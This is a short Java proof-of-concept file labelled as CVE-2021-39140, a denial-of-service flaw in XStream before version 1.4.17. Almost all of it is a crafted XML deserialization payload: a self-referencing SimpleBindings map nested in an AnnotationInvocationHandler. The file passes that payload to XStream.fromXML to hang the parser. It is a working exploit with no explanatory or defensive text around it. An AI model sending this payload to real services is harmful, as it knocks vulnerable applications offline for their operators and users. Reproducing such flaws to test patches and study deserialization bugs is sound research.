package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * @author Whoopsunix
 * XStream < 1.4.17
 * DDOS
 */
public class CVE_2021_39140 {
    public static void main(String[] args) {
        String payload = "<linked-hash-set>\n" +
                "  <sun.reflect.annotation.AnnotationInvocationHandler serialization='custom'>\n" +
                "    <sun.reflect.annotation.AnnotationInvocationHandler>\n" +
                "      <default>\n" +
                "        <memberValues class='javax.script.SimpleBindings'>\n" +
                "          <map class='javax.script.SimpleBindings' reference='..'/>\n" +
                "        </memberValues>\n" +
                "        <type>javax.xml.transform.Templates</type>\n" +
                "      </default>\n" +
                "    </sun.reflect.annotation.AnnotationInvocationHandler>\n" +
                "  </sun.reflect.annotation.AnnotationInvocationHandler>\n" +
                "</linked-hash-set>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
